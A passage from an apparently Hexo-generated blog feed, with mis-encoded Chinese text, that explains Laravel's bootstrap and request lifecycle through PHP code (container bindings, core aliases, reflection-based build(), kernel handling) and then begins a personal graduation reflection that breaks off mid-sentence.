class="comment">//database_path()   database ç›®å½•çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.resources'</span>, <span class="keyword">$this</span>-&gt;resourcePath());   <span class="comment">//resource_path()   resource ç›®å½•çš„ç»å¯¹è·¯å¾„</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'path.bootstrap'</span>, <span class="keyword">$this</span>-&gt;bootstrapPath());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-1-2-æ³¨å†ŒåŸºç¡€ç»‘å®š"><a href="#2-1-2-æ³¨å†ŒåŸºç¡€ç»‘å®š" class="headerlink" title="2.1.2 æ³¨å†ŒåŸºç¡€ç»‘å®š"></a>2.1.2 æ³¨å†ŒåŸºç¡€ç»‘å®š</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">registerBaseBindings</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>::setInstance(<span class="keyword">$this</span>);                                             <span class="comment">//å®ä¾‹åŒ– Application</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(<span class="string">'app'</span>, <span class="keyword">$this</span>);                                          <span class="comment">//å°† Application æ³¨å†Œåˆ°å®¹å™¨ä¸­ ???</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(Container::class, <span class="keyword">$this</span>);                               <span class="comment">//å°† ???</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;singleton(Mix::class);                                           <span class="comment">//å®ä¾‹åŒ– Mix ç±» ???</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance(PackageManifest::class, <span class="keyword">new</span> PackageManifest(            <span class="comment">//å°†æ–‡ä»¶è·¯å¾„æ³¨å†Œåˆ°å®¹å™¨ä¸­ ???</span></span><br><span class="line">        <span class="keyword">new</span> Filesystem, <span class="keyword">$this</span>-&gt;basePath(), <span class="keyword">$this</span>-&gt;getCachedPackagesPath()</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-1-3-æ³¨å†ŒåŸºç¡€æœåŠ¡æä¾›è€…"><a href="#2-1-3-æ³¨å†ŒåŸºç¡€æœåŠ¡æä¾›è€…" class="headerlink" title="2.1.3 æ³¨å†ŒåŸºç¡€æœåŠ¡æä¾›è€…"></a>2.1.3 æ³¨å†ŒåŸºç¡€æœåŠ¡æä¾›è€…</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">registerBaseServiceProviders</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> EventServiceProvider(<span class="keyword">$this</span>));       <span class="comment">//æ³¨å†Œäº‹ä»¶æœåŠ¡æä¾›è€…</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> LogServiceProvider(<span class="keyword">$this</span>));         <span class="comment">//æ³¨å†Œæ—¥å¿—æœåŠ¡æä¾›è€…</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;register(<span class="keyword">new</span> RoutingServiceProvider(<span class="keyword">$this</span>));     <span class="comment">//æ³¨å†Œè·¯ç”±æœåŠ¡æä¾›è€…</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-1-4-æ³¨å†Œå†…æ ¸å®¹å™¨åˆ«å"><a href="#2-1-4-æ³¨å†Œå†…æ ¸å®¹å™¨åˆ«å" class="headerlink" title="2.1.4 æ³¨å†Œå†…æ ¸å®¹å™¨åˆ«å"></a>2.1.4 æ³¨å†Œå†…æ ¸å®¹å™¨åˆ«å</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerCoreContainerAliases</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ([</span><br><span class="line">        <span class="string">'app'</span>                  =&gt; [\Illuminate\Foundation\Application::class, \Illuminate\Contracts\Container\Container::class, \Illuminate\Contracts\Foundation\Application::class,  \Psr\Container\ContainerInterface::class],</span><br><span class="line">        <span class="string">'auth'</span>                 =&gt; [\Illuminate\Auth\AuthManager::class, \Illuminate\Contracts\Auth\Factory::class],</span><br><span class="line">        <span class="string">'auth.driver'</span>          =&gt; [\Illuminate\Contracts\Auth\Guard::class],</span><br><span class="line">        <span class="string">'blade.compiler'</span>       =&gt; [\Illuminate\View\Compilers\BladeCompiler::class],</span><br><span class="line">        <span class="string">'cache'</span>                =&gt; [\Illuminate\Cache\CacheManager::class, \Illuminate\Contracts\Cache\Factory::class],</span><br><span class="line">        <span class="string">'cache.store'</span>          =&gt; [\Illuminate\Cache\Repository::class, \Illuminate\Contracts\Cache\Repository::class],</span><br><span class="line">        <span class="string">'config'</span>               =&gt; [\Illuminate\Config\Repository::class, \Illuminate\Contracts\Config\Repository::class],</span><br><span class="line">        <span class="string">'cookie'</span>               =&gt; [\Illuminate\Cookie\CookieJar::class, \Illuminate\Contracts\Cookie\Factory::class, \Illuminate\Contracts\Cookie\QueueingFactory::class],</span><br><span class="line">        <span class="string">'encrypter'</span>            =&gt; [\Illuminate\Encryption\Encrypter::class, \Illuminate\Contracts\Encryption\Encrypter::class],</span><br><span class="line">        <span class="string">'db'</span>                   =&gt; [\Illuminate\Database\DatabaseManager::class],</span><br><span class="line">        <span class="string">'db.connection'</span>        =&gt; [\Illuminate\Database\Connection::class, \Illuminate\Database\ConnectionInterface::class],</span><br><span class="line">        <span class="string">'events'</span>               =&gt; [\Illuminate\Events\Dispatcher::class, \Illuminate\Contracts\Events\Dispatcher::class],</span><br><span class="line">        <span class="string">'files'</span>                =&gt; [\Illuminate\Filesystem\Filesystem::class],</span><br><span class="line">        <span class="string">'filesystem'</span>           =&gt; [\Illuminate\Filesystem\FilesystemManager::class, \Illuminate\Contracts\Filesystem\Factory::class],</span><br><span class="line">        <span class="string">'filesystem.disk'</span>      =&gt; [\Illuminate\Contracts\Filesystem\Filesystem::class],</span><br><span class="line">        <span class="string">'filesystem.cloud'</span>     =&gt; [\Illuminate\Contracts\Filesystem\Cloud::class],</span><br><span class="line">        <span class="string">'hash'</span>                 =&gt; [\Illuminate\Hashing\HashManager::class],</span><br><span class="line">        <span class="string">'hash.driver'</span>          =&gt; [\Illuminate\Contracts\Hashing\Hasher::class],</span><br><span class="line">        <span class="string">'translator'</span>           =&gt; [\Illuminate\Translation\Translator::class, \Illuminate\Contracts\Translation\Translator::class],</span><br><span class="line">        <span class="string">'log'</span>                  =&gt; [\Illuminate\Log\LogManager::class, \Psr\Log\LoggerInterface::class],</span><br><span class="line">        <span class="string">'mailer'</span>               =&gt; [\Illuminate\Mail\Mailer::class, \Illuminate\Contracts\Mail\Mailer::class, \Illuminate\Contracts\Mail\MailQueue::class],</span><br><span class="line">        <span class="string">'auth.password'</span>        =&gt; [\Illuminate\Auth\Passwords\PasswordBrokerManager::class, \Illuminate\Contracts\Auth\PasswordBrokerFactory::class],</span><br><span class="line">        <span class="string">'auth.password.broker'</span> =&gt; [\Illuminate\Auth\Passwords\PasswordBroker::class, \Illuminate\Contracts\Auth\PasswordBroker::class],</span><br><span class="line">        <span class="string">'queue'</span>                =&gt; [\Illuminate\Queue\QueueManager::class, \Illuminate\Contracts\Queue\Factory::class, \Illuminate\Contracts\Queue\Monitor::class],</span><br><span class="line">        <span class="string">'queue.connection'</span>     =&gt; [\Illuminate\Contracts\Queue\Queue::class],</span><br><span class="line">        <span class="string">'queue.failer'</span>         =&gt; [\Illuminate\Queue\Failed\FailedJobProviderInterface::class],</span><br><span class="line">        <span class="string">'redirect'</span>             =&gt; [\Illuminate\Routing\Redirector::class],</span><br><span class="line">        <span class="string">'redis'</span>                =&gt; [\Illuminate\Redis\RedisManager::class, \Illuminate\Contracts\Redis\Factory::class],</span><br><span class="line">        <span class="string">'request'</span>              =&gt; [\Illuminate\Http\Request::class, \Symfony\Component\HttpFoundation\Request::class],</span><br><span class="line">        <span class="string">'router'</span>               =&gt; [\Illuminate\Routing\Router::class, \Illuminate\Contracts\Routing\Registrar::class, \Illuminate\Contracts\Routing\BindingRegistrar::class],</span><br><span class="line">        <span class="string">'session'</span>              =&gt; [\Illuminate\Session\SessionManager::class],</span><br><span class="line">        <span class="string">'session.store'</span>        =&gt; [\Illuminate\Session\Store::class, \Illuminate\Contracts\Session\Session::class],</span><br><span class="line">        <span class="string">'url'</span>                  =&gt; [\Illuminate\Routing\UrlGenerator::class, \Illuminate\Contracts\Routing\UrlGenerator::class],</span><br><span class="line">        <span class="string">'validator'</span>            =&gt; [\Illuminate\Validation\Factory::class, \Illuminate\Contracts\Validation\Factory::class],</span><br><span class="line">        <span class="string">'view'</span>                 =&gt; [\Illuminate\View\Factory::class, \Illuminate\Contracts\View\Factory::class],</span><br><span class="line">    ] <span class="keyword">as</span> $key =&gt; $aliases) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($aliases <span class="keyword">as</span> $alias) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;alias($key, $alias);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-å†…æ ¸ç»‘å®š"><a href="#2-2-å†…æ ¸ç»‘å®š" class="headerlink" title="2.2 å†…æ ¸ç»‘å®š"></a>2.2 å†…æ ¸ç»‘å®š</h4><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦ç»‘å®šä¸€äº›é‡è¦æ¥å£åˆ°å®¹å™¨ä¸­ï¼Œä»¥ä½¿æˆ‘ä»¬åœ¨éœ€è¦æ—¶èƒ½å¤Ÿä»å®¹å™¨ä¸­è§£æã€‚å†…æ ¸æœåŠ¡å¯ä»¥å¤„ç†æ¥è‡ª web ä¸ cli çš„è¯·æ±‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Http\Kernel::class,</span><br><span class="line">    App\Http\Kernel::class</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Console\Kernel::class,</span><br><span class="line">    App\Console\Kernel::class</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$app-&gt;singleton(</span><br><span class="line">    Illuminate\Contracts\Debug\ExceptionHandler::class,</span><br><span class="line">    App\Exceptions\Handler::class</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="3-ä»å®¹å™¨ä¸­è§£æ-Kernel"><a href="#3-ä»å®¹å™¨ä¸­è§£æ-Kernel" class="headerlink" title="3. ä»å®¹å™¨ä¸­è§£æ Kernel"></a>3. ä»å®¹å™¨ä¸­è§£æ Kernel</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">build</span><span class="params">($concrete)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($concrete <span class="keyword">instanceof</span> Closure) &#123;</span><br><span class="line">        <span class="keyword">return</span> $concrete(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;getLastParameterOverride());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $reflector = <span class="keyword">new</span> ReflectionClass($concrete);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ReflectionException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> BindingResolutionException(<span class="string">"Target class [$concrete] does not exist."</span>, <span class="number">0</span>, $e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! $reflector-&gt;isInstantiable()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;notInstantiable($concrete);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;buildStack[] = $concrete;</span><br><span class="line"></span><br><span class="line">    $constructor = $reflector-&gt;getConstructor();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_null($constructor)) &#123;</span><br><span class="line">        array_pop(<span class="keyword">$this</span>-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> $concrete;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $dependencies = $constructor-&gt;getParameters();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $instances = <span class="keyword">$this</span>-&gt;resolveDependencies($dependencies);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (BindingResolutionException $e) &#123;</span><br><span class="line">        array_pop(<span class="keyword">$this</span>-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> $e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    array_pop(<span class="keyword">$this</span>-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $reflector-&gt;newInstanceArgs($instances);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨Laravelæ¡†æ¶ä¸­ï¼Œè§£ææœåŠ¡æ˜¯é€šè¿‡<code>build()</code>å‡½æ•°å®ç°çš„ï¼Œä¸€èˆ¬åˆ†ä¸ºä¸¤ç§æƒ…å†µ: ä¸€ç§æ˜¯æŸ¥æ‰¾å¯¹åº”æœåŠ¡æ˜¯å¦è¢«æœåŠ¡æä¾›è€…æ³¨å†Œä¸ºå®ä¾‹æˆ–æä¾›æœåŠ¡çš„åŒ¿åå‡½æ•°ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ç›´æ¥è¿›è¡ŒæœåŠ¡è§£æï¼›ç¬¬äºŒç§æ˜¯æœåŠ¡åç§°æ²¡æœ‰ç›¸åº”çš„æœåŠ¡ç»‘å®šï¼Œé€šè¿‡åå°„æœºåˆ¶æ¥åŠ¨æ€åˆ›å»ºæœåŠ¡ã€‚é€šè¿‡åå°„æœºåˆ¶åŠ¨æ€åˆ›å»ºæœåŠ¡çš„è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼šç¬¬ä¸€æ­¥æ˜¯é€šè¿‡åå°„æœºåˆ¶è·å–æœåŠ¡ç±»æ„é€ å‡½æ•°çš„ä¿¡æ¯ï¼Œç¬¬äºŒæ­¥æ˜¯è§£å†³æœåŠ¡ç±»æ„é€ å‡½æ•°çš„ä¾èµ–é—®é¢˜ã€‚é¦–å…ˆï¼Œé€šè¿‡<code>$reflector = new ReflectionClass($concrete);</code>æ¥åˆ›å»ºä¸€ä¸ªåå°„ç±»å®ä¾‹ï¼Œå…¶ä¸­<code>$concrete</code> æ˜¯ç±»çš„åç§°ï¼Œç„¶åé€šè¿‡<code>$reflector-&gt;isInstantiable();</code>åˆ¤æ–­è¿™ä¸ªç±»æ˜¯å¦å¯ä»¥å®ä¾‹åŒ–ï¼Œå¦‚æœä¸å¯ä»¥åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œæ¥ç€é€šè¿‡<code>$constructor = $reflector-&gt;getConstructor();</code>æ¥è·å–ç±»çš„æ„é€ æ–¹æ³•ï¼Œå½“è¯¥ç±»å­˜åœ¨æ„é€ å‡½æ•°æ—¶,è¿”å›ä¸€ä¸ª <code>ReflectionMethod</code> å¯¹è±¡ï¼Œç›¸å½“äºè·å–æ„é€ å‡½æ•°çš„åå°„ç±»ï¼Œå½“ç±»ä¸å­˜åœ¨æ„é€ å‡½æ•°æ—¶è¿”å› <code>NULL</code>ï¼Œæœ€åé€šè¿‡<code>is_null($constructor)</code> åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ„é€ å‡½æ•°ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ç›´æ¥å®ä¾‹åŒ–è¯¥ç±»ï¼Œå¦‚æœå­˜åœ¨åˆ™é€šè¿‡<code>$dependencies = $constructor-&gt;getParameters();</code>æ¥è·å–æ„é€ å‡½æ•°ä¾èµ–çš„è¾“äººå‚æ•°ã€‚ä¸‹é¢å°†è§£å†³æ„é€ å‡½æ•°ä¸­ä¾èµ–å‚æ•°çš„é—®é¢˜ï¼Œè¿›è€Œå®ç°ä¾èµ–æ³¨äººã€‚</p><h3 id="4-æ¥æ”¶è¯·æ±‚å¹¶å¤„ç†"><a href="#4-æ¥æ”¶è¯·æ±‚å¹¶å¤„ç†" class="headerlink" title="4. æ¥æ”¶è¯·æ±‚å¹¶å¤„ç†"></a>4. æ¥æ”¶è¯·æ±‚å¹¶å¤„ç†</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬å‘é¡¹ç›®å‘èµ·è¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè°ƒç”¨å…¥å£æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œå…¥å£æ–‡ä»¶ä¼šé€šè¿‡<code>Illuminate\Http\Request</code>ç±»çš„é™æ€æ–¹æ³•<code>createFromGlobals()</code>å®ç°è¯·æ±‚çš„å®ä¾‹åŒ–ï¼Œç„¶åé€šè¿‡è·¯ç”±è¿›è¡Œåˆ†å‘å¤„ç†ï¼Œè·¯ç”±ä¼šæ ¹æ®è¯·æ±‚çš„åœ°å€æŸ¥æ‰¾è·¯ç”±è¡¨ï¼ŒæŸ¥æ‰¾åˆ°å°†é€šè¿‡è·¯ç”±è¡¨ä¸­å¯¹åº”çš„ç›¸åº”å‡½æ•°è¿›è¡Œè¯·æ±‚å¤„ç†å¹¶è¿”å›å“åº”ï¼Œå¦åˆ™å°†è¿”å›404 é”™è¯¯ã€‚è¿™å°±æ˜¯è·¯ç”±çš„åŸºæœ¬å·¥ä½œè¿‡ç¨‹ã€‚</p><p>å¯åŠ¨ Eloquent ORM æ¨¡å—é˜¶æ®µéœ€è¦ç”¨åˆ°æ•°æ®åº“çš„ç®¡ç†ç±»ï¼Œå³ <code>Illuminate\Database\Capsule\Manager</code> ç±»ï¼Œäºæ˜¯æ·»åŠ äº†å¯¹åº”çš„å‘½åç©ºé—´å¹¶è¿›è¡Œäº†åˆå§‹åŒ–ï¼Œç„¶åé€šè¿‡<code>addConnection()</code>å‡½æ•°å®Œæˆæ•°æ®åº“çš„ç›¸å…³é…ç½®å¹¶é€šè¿‡<code>bootEloquent()</code>å‡½æ•°å®Œæˆæ•°æ®åº“ Eloquent ORM æ¨¡å—çš„å¯åŠ¨ã€‚åœ¨å¯åŠ¨å®Œæˆåï¼Œå°±å¯ä»¥æ“ä½œæ•°æ®åº“äº†ï¼Œé€šè¿‡ Eloquent ORM æ–¹å¼æ“ä½œæ•°æ®åº“éœ€è¦ä¸¤ä¸ªæ­¥éª¤æ¥å®ç°ï¼Œä¸€æ˜¯åˆ›å»ºæ¨¡å‹ç±»ï¼ŒäºŒæ˜¯é€šè¿‡æ¨¡å‹ç±»çš„æ–¹æ³•æ“ä½œæ•°æ®åº“ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Capsule</span>\<span class="title">Manager</span>;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'LARAVEL_START'</span>, microtime(<span class="keyword">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/../vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">$app = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">'/../bootstrap/app.php'</span>;</span><br><span class="line"></span><br><span class="line">$manager = <span class="keyword">new</span> Manager();</span><br><span class="line">$manager-&gt;addConnection(<span class="keyword">require</span> <span class="string">'../config/database.php'</span>);</span><br><span class="line">$manager-&gt;bootEloquent();</span><br><span class="line"></span><br><span class="line">$request = \Illuminate\Http\Request::createFromGlobals();</span><br><span class="line">$response = $app[<span class="string">'router'</span>]-&gt;dispatch($request);</span><br><span class="line">$response-&gt;send();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $kernel = $app-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $response = $kernel-&gt;handle(</span></span><br><span class="line"><span class="comment">//     $request = Illuminate\Http\Request::capture()</span></span><br><span class="line"><span class="comment">// );</span></span><br><span class="line"></span><br><span class="line">$kernel-&gt;terminate($request, $response);</span><br></pre></td></tr></table></figure><h3 id="5-å“åº”è¯·æ±‚"><a href="#5-å“åº”è¯·æ±‚" class="headerlink" title="5. å“åº”è¯·æ±‚"></a>5. å“åº”è¯·æ±‚</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$response-&gt;send();</span><br></pre></td></tr></table></figure><h4 id="6-ç»ˆæ­¢ç¨‹åº"><a href="#6-ç»ˆæ­¢ç¨‹åº" class="headerlink" title="6. ç»ˆæ­¢ç¨‹åº"></a>6. ç»ˆæ­¢ç¨‹åº</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$kernel-&gt;terminate($request, $response);</span><br></pre></td></tr></table></figure><hr><p><em>æœªå®Œå¾…ç»­â€¦â€¦</em></p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ï¼ŒPHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†™åœ¨æ¯•ä¸šå­£</title>
      <link href="/post/graduation/"/>
      <url>/post/graduation/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g48hfo0bj8j30zk0nnwif.jpg" alt=""></p><p>å››å¹´å‰çš„ä»Šå¤©ï¼Œæˆ‘ç¦»å¼€äº†å­¦æ ¡ã€‚</p><a id="more"></a><p>è¿˜è®°å¾—å°å­¦æ¯•ä¸šæ—¶ï¼Œæœ‰å¾ˆå¤šæ— è¯ä¸è°ˆçš„ç©ä¼´ï¼Œå¦‚ä»Šå´åœ¨å¯’æš„ä¹‹åçªç„¶å®‰é™ï¼›åˆä¸­æ¯•ä¸šæ—¶ï¼Œå¾ˆå¤šåŒå­¦éƒ½åœ¨åŒå­¦å½•ä¸Šçš„æ¢¦æƒ³ä¸€æ å†™ä¸‹äº†ã€Œç¯æ¸¸ä¸–ç•Œã€ï¼Œä¸çŸ¥é“ä»–ä»¬ç°åœ¨æ˜¯å¦è¿˜è®°å¾—ï¼›é«˜ä¸­æ¯•ä¸šæ—¶ï¼Œå¾ˆå¤šåŒå­¦å†™é“ã€Œæœ‰äº‹æ²¡äº‹å¸¸è”ç³»ã€ï¼Œä½†å¾ˆå¤šäººå·²ç»åœ¨åˆ—è¡¨æ²‰å¯‚å¤šå¹´ï¼›å¤§å­¦æ¯•ä¸šæ—¶ï¼Œé…’æ¡Œä¸Šè§¥ç­¹äº¤é”™ï¼Œæœ‰äººé…’åè¯‰è¯´ç€ç¦»åˆ«ä¹‹æ®‡ï¼Œæœ‰äººèµ°å‡ºé¥­é¦†ä¾¿åäº†ä¸€åœ°ï¼Œæœ‰äººå¿™ç¢Œçš„ç…§é¡¾ç€å¤§å®¶â€¦â€¦æœ›ç€ä»–ä»¬ç›¸æ‰¶ç€æ‘‡æ‘‡æ™ƒæ™ƒèµ°è¿›æ ¡å›­çš„èƒŒå½±ï¼Œä½ ä¸ç¦ä¼šæƒ³ï¼šå½“æ˜å¤©çš„å¤ªé˜³å‡èµ·æ—¶ï¼Œå„è‡ªå¼€å§‹æ”¶æ‹¾è‡ªå·±çš„è¡Œå›Šï¼Œè¸ä¸Šæœªæ‰€çŸ¥çš„å‰è·¯â€¦â€¦</p><p>åœ¨å²æœˆæµè½¬é—´ï¼Œæ—©å·²æ¨¡ç³Šäº†å°‘å¹´ã€‚é‚£æ—¶æ‰€å¥¢æœ›çš„é‡‘é’±ï¼Œå´å¿½ç•¥äº†è‡ªå·±æ‰€æ‹¥æœ‰æœ€å®è´µçš„è´¢å¯Œâ€”â€”æ—¶é—´ã€‚åœ¨æ—¥å¤ä¸€æ—¥çš„è¿·èŒ«ä¸­ï¼Œç»ˆæ—¥æ— æ‰€äº‹äº‹ï¼Œåœ¨ä¸çŸ¥ä¸è§‰é—´å°±èµ°åˆ°äº† 2015 å¹´çš„å¤å¤©ã€‚é‚£ä¸ªå¤å¤©ä¸å¾€å¹´å¹¶æ²¡æœ‰ä»€ä¹ˆä¸åŒï¼Œåªæ˜¯å½“å¹´æ‰€ç¾¡æ…•çš„æ¯•ä¸šç…§ä¸»è§’å˜æˆäº†è‡ªå·±ã€‚éšç€ç¦»æ ¡æ—¥æœŸçš„ä¸´è¿‘ï¼Œå„ç§å„æ ·çš„é¥­å±€éšä¹‹è€Œæ¥ï¼Œæˆ‘è®°å¾—å½“æ—¶è¿˜åœ¨è°ƒä¾ƒè¯´â€œè¿™æ•£ä¼™é¥­éƒ½åƒäº†ä¸€ä¸ªæœˆè¿˜æ²¡æ•£ä¼™â€ã€‚åœ¨å­¦æ ¡æœ€åçš„æ—¥å­é‡Œï¼Œ428 å®¿èˆæ²¡æ—¥æ²¡å¤œçš„éº»å°†ï¼Œ430 å‡Œæ™¨è¿˜åœ¨ DOTA ä¸­å¥‹æˆ˜â€¦â€¦è¿™äº›å£°éŸ³çŠ¹åœ¨è€³ç•”ï¼Œä½†æ¨¡æ 